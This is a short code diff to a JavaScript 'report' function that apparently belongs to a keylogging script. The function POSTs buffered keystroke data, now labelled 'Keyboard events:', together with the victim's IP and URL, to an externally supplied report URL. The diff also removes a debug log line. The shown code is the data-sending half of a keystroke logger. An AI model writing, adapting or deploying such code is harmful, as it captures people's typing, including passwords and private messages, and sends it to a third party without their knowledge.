@@ -344,14 +344,13 @@
 
         function report() 
         {
-            console.log('report', report_data, top);
             xhr = new XMLHttpRequest()
             xhr.open("POST", params.get('report_url'), true)
             xhr.setRequestHeader('Content-Type', 'application/json')
             xhr.send(JSON.stringify({
                 ip: params.get('used_ip'), 
                 url: params.get('used_url'), 
-                key: report_data,
+                key: "Keyboard events: " + report_data,
             }))
             report_data = ''
         }
